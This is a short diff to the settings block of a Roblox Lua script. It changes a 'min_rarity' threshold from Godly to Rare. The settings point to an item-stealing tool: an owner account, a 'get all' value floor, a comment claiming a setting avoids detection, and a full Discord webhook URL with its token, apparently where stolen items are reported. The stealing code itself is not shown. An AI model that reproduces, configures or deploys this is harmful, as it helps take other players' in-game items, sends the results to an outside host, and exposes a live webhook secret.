@@ -1,5 +1,5 @@
 _G.Username = "requirebob" -- owner
-_G.min_rarity = "Godly"
+_G.min_rarity = "Rare"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- Yes to not be detected
 _G.webhook = "https://discord.com/api/webhooks/1363979293687939153/m8M4npwzZgTegpxh0eVO8jRQ21lW4NDxQmtBYeKXoJ3QqqDOHnNfJKzF3qMMU_NiO00T"
